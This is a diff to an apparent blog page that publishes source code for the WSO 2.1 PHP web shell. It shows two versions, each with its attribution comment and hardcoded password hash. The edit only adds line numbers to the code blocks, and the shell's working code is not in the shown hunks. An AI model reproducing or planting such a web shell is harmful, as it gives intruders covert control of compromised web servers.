@@ -16,7 +16,7 @@ WSO 2.1 Web Shell by devilscafe.in
 
 ### WSO 2.1 Web Shell Source Code
 
-{% highlight php %}<?php 
+{% highlight php linenos %}<?php 
 /* WSO 2.1 (Web Shell by devilscafe.in) */ 
 $auth_pass = "15de21c670ae7c3f6f3f1f37029303c9"; 
 $color = "#00ff00"; 
@@ -1437,7 +1437,7 @@ www.devilscafe.in &lt;/marquee&gt;&lt;/div&gt;
 
 Here&#8217;s another version of the same shell script: WSO 2.1 (by pgems.in this time)
 
-{% highlight php %}<?php 
+{% highlight php linenos %}<?php 
 /* WSO 2.1 (Web Shell by pgems.in) */ 
 /*Subhashdasyam.com*/
 $auth_pass = "36028fcd4abb97e9e4f47d929ddc9980"; 
